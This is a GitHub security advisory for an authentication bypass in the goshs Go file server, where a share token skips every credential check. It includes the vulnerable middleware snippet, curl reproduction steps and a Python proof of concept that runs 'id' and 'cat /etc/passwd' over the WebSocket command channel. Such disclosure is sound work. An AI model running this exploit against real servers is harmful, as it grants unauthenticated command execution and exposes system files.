# [H] goshs has Auth Bypass via Share Token

## Summary
Severity: High
Advisory: GHSA-jgfx-74g2-9r6g
CVE: CVE-2026-34581
CWE: CWE-288
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-jgfx-74g2-9r6g
Type: github-advisory

## Affected
- Go: `github.com/patrickhener/goshs` — affected >=1.1.0

## Details
### Summary
When using the `Share Token` it is possible to bypass the limited selected file download with all the gosh functionalities, including code exec.

### Details

The `BasicAuthMiddleware` checks for a `?token=` parameter **before** checking credentials. If the token exists in `SharedLinks`, the request passes through with **no auth check at all**. The handler then processes all query parameters — including `?ws` (WebSocket) which has higher priority than `?token`.

```go
// middleware.go:22-30 — token check runs FIRST
token := r.URL.Query().Get("token")
if token != "" {
    _, ok := fs.SharedLinks[token]
    if ok {
        next.ServeHTTP(w, r)  // Full auth bypass
        return
    }
}
// ... normal auth checks never reached
```

A share token is designed for **single-file, time-limited downloads**. But the middleware bypass grants access to everything — directory listing, file deletion, clipboard, WebSocket, and CLI command execution.


**1. Create a webroot:**

```bash
mkdir -p /tmp/goshs-webroot
echo "shareable file" > /tmp/goshs-webroot/shareable.txt
```

**2. Start goshs with auth + TLS + CLI mode:**

```bash
/tmp/goshs-test -d /tmp/goshs-webroot -b 'admin:password' -s -ss -c -p 8000
```

> CLI mode requires auth (`-b`) and TLS (`-s -ss`). This is the documented usage — not a weakened config.

**3. Verify authentication is required:**

```bash
curl -sk https://localhost:8000/
Not authorized
```

**4. As a legitimate user, create a share link:**

```bash
curl -sk -u admin:password 'https://localhost:8000/shareable.txt?share'
```

Response:
```json
{"urls":["https://127.0.0.1:8000/shareable.txt?token=gMP-w0hXRs-Q-FEZku63kA"]}
```

Save the token value (e.g., `gMP-w0hXRs-Q-FEZku63kA`).

**5. Prove the token bypasses auth for WebSocket:**

```bash
# Without token → 401 (blocked)
curl -sk -o /dev/null -w "%{http_code}" \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  'https://localhost:8000/?ws'
# 401

# With token → 101 Switching Protocols (auth bypassed!)
curl -sk -o /dev/null -w "%{http_code}" \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  'https://localhost:8000/?ws&token=gMP-w0hXRs-Q-FEZku63kA'
# 101
```

For a Full PoC, you can run the python file attached below, it will run `id` and `cat /etc/passwd`.




### PoC

``` python
import json, ssl, websocket

TOKEN = "gMP-w0hXRs-Q-FEZku63kA"  # ← replace with your token

ws = websocket.create_connection(
    f"wss://localhost:8000/?ws&token={TOKEN}",
    sslopt={"cert_reqs": ssl.CERT_NONE},
)
print("[+] Connected WITHOUT credentials!")

# Execute 'id'
ws.send('{"type":"command","Content":"id"}')
import time; time.sleep(1)
resp = json.loads(ws.recv())
print(f"Output: {resp['content']}")
# uid=501(youruser) gid=20(staff) ...

# Execute 'cat /etc/passwd'
ws.send('{"type":"command","Content":"cat /etc/passwd"}')
time.sleep(1)
resp = json.loads(ws.recv())
print(f"Output: {resp['content']}")

ws.close()
```
A patch is available at https://github.com/patrickhener/goshs/releases/tag/v2.0.0-beta.2.

## References
- https://github.com/patrickhener/goshs/security/advisories/GHSA-jgfx-74g2-9r6g
- https://nvd.nist.gov/vuln/detail/CVE-2026-34581
- https://github.com/patrickhener/goshs/commit/6fb224ed15c2ccc0c61a5ebe22f2401eb06e9216
- https://github.com/patrickhener/goshs
- https://github.com/patrickhener/goshs/releases/tag/v2.0.0-beta.2
